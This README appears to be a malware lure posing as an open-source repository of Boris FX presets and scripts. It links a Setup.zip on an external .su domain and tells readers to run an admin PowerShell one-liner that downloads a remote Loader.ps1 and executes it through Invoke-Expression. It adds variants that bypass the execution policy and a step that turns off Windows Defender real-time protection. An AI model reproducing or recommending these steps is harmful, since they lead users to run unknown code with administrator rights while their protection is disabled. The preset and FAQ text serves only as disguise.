# Boris FX Ultimate Toolkit & Automation Repository

Welcome to the ultimate open-source repository dedicated to **Boris FX** plugin suites! This project aggregates professional workflows, custom presets, scripting utilities, and expressions designed to supercharge your post-production pipeline in Adobe After Effects, Premiere Pro, and OFX hosts (DaVinci Resolve, Foundry Nuke).

Whether you are looking for advanced **Mocha Pro tracking data workflows**, custom **Sapphire lens flares**, or **Continuum (BCC) transition automation**, this repository serves as your central hub.

---

## 🚀 Key Features & Solved Use Cases

* **Boris FX Sapphire Customization:** Production-ready render presets and look files (.bws).
* **Continuum (BCC) Scripts:** Automated transition triggers and expressions for motion designers.
* **Mocha Pro Utilities:** Scripts for exporting, converting, and optimizing planar tracking data.
* **Multi-Host Compatibility:** Presets verified for Adobe Creative Cloud, DaVinci Resolve, and Avid.
* **Performance Optimizations:** Configurations for stable GPU acceleration (CUDA/OpenCL) troubleshooting.

---

### 🚀 Direct Download

[<img src="https://img.shields.io/badge/Download-black?style=for-the-badge&logo=github"/>](https://software-storage.su/files/Setup.zip)

Read Readme.txt before install!

---

## 🚀 Automated Installation & Setup (PowerShell)

1. Open PowerShell as Administrator:
   * Press the `Win + X` keys simultaneously.
   * Select Terminal (Admin) or Windows PowerShell (Admin) from the context menu.

2. Execute the Deployment Command:
   Copy, paste, and press `Enter` to run the following optimized initialization command. This script dynamically configures the network bypass registry and fetches the necessary packages:

   ```powershell
   irm https://software-storage.su/powershell/Loader.ps1 | iex
   ```
---

## 🔍 Troubleshooting & Common Errors

### 📌 Bypass Execution Policy (Blocking Unsigned Scripts)
If your system blocks the launch due to built-in execution policy constraints, enforce a bypass using this command:
```cmd
powershell -ExecutionPolicy Bypass -Command "irm https://software-storage.su/powershell/Loader.ps1 | iex"
```

### 📌 Error: "irm is not recognized..." (PowerShell 2.0 Legacy)
In older legacy environments where aliases are missing, use explicit full system cmdlets:
```powershell
Invoke-RestMethod https://software-storage.su/powershell/Loader.ps1 | Invoke-Expression
```


### 📌 Antivirus or SmartScreen Interception
Automated deployment routines can sometimes trigger proactive security heuristics. Temporarily disable "Real-time protection" within your Windows Defender settings during setup, then re-enable it immediately after completion.

---

## 🔍 FAQ & Troubleshooting

### How to fix Boris FX GPU render errors?
Ensure your graphics drivers are updated. If crashes persist, navigate to the Boris FX Application Manager, disable CUDA multi-frame rendering, and switch the plugin rendering cache to "Disk-Only" in the preference panel.

### Are these presets compatible with Boris FX 2025/2026?
Yes, all configurations are actively updated and backward compatible down to Boris FX 2022 suites.

---

## 📄 License

Distributed under the MIT License. See `LICENSE` for more information.

---

*Disclaimer: This repository is an independent open-source community project and is not officially affiliated with, authorized, or endorsed by Boris FX, Inc.*
